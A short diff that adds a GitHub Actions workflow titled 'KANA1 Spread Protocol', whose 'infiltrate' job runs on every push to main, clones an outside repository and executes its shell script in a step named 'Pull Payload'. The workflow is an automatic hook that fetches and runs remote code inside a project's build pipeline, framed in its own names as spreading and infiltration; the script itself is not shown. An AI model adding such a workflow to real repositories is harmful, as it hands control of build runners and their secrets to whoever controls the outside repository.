@@ -1,0 +1,15 @@
+name: 🩸 KANA1 Spread Protocol
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  infiltrate:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Pull Payload
+      run: |
+        git clone https://github.com/Kingkana22/KANA1-SUPER-OPS
+        cd KANA1-SUPER-OPS
+        bash LATIUM_BLACK.sh
